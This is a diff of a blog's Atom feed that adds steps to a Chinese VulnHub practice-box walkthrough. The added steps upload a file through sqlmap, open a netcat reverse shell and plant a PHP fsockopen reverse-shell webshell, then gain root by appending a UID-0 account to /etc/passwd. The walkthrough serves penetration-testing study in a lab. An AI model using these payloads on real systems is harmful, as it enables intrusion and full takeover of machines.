@@ -3,11 +3,11 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝 • Posts by &#34;web安全&#34; category</title>
     <link href="https://my011215.github.io" />
-    <updated>2025-03-10T07:30:30.000Z</updated>
+    <updated>2025-03-16T07:30:30.000Z</updated>
     <entry>
-        <id>https://my011215.github.io/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
+        <id>https://my011215.github.io/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
         <title>vulnhub靶机学习记录</title>
-        <link rel="alternate" href="https://my011215.github.io/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
+        <link rel="alternate" href="https://my011215.github.io/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
         <content type="html">&lt;!-- toc --&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#jis-ctf&#34;&gt;JIS-CTF&lt;/a&gt;
@@ -351,8 +351,58 @@ ogay！可以正常代理登录，尝试查看当前用户的 sudo 命令有什�
  &lt;code&gt;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&lt;/code&gt; &lt;br&gt;
 www-data 网站权限到手&lt;br&gt;
 &lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/480.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;文件上传&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -u &amp;quot;http://192.168.21.152/se3reTdir777/&amp;quot; --data &amp;quot;uid=1&amp;amp;Operation=Submit&amp;quot; --file-write D:/test.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/test.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/482.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/483.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/484.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/485.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/486.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;反弹 shell&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/487.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;-e 参数不可用，只能换一种连接方式&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/488.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.21.132 6666 &amp;gt;/tmp/f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/489.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;成功返回 shell&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/490.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;似乎不是很稳定&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/491.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/492.gif?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;上传马获取 shell 权限&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;上传文件的一些小技巧：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1. 通过--file-write写入，再获取oshsell得到网站权限，最后php shell.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. 通过python起一个网站服务，获取oshsell得到网站权限后，在os-shell中执行wget命令下载反弹文件，最后php shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$sock=fsockopen(&amp;quot;192.168.21.132&amp;quot;,6667);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.21.152/se3reTdir777/&amp;quot; --data &amp;quot;uid=1&amp;amp;Operation=Submit&amp;quot; --file-write D:/shell.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;成功回显命令&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/493.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;建立交互式 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;提权&lt;br&gt;
+创建 myhacker 账号&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl passwd -1 -salt my 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;myhacker:$1$myhacker$fET8oFRfWlj8ZLk7eDnkM/:0:0::/root:/bin/bash&amp;#x27;&amp;gt;&amp;gt;/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/494.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到 root 权限&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/495.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ol start=&#34;8&#34;&gt;
+&lt;li&gt;获取 flag&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/496.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ol&gt;
 </content>
-        <updated>2025-03-10T07:30:30.000Z</updated>
+        <updated>2025-03-16T07:30:30.000Z</updated>
     </entry>
     <entry>
         <id>https://my011215.github.io/2024/04/05/Penetration%20testing/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</id>
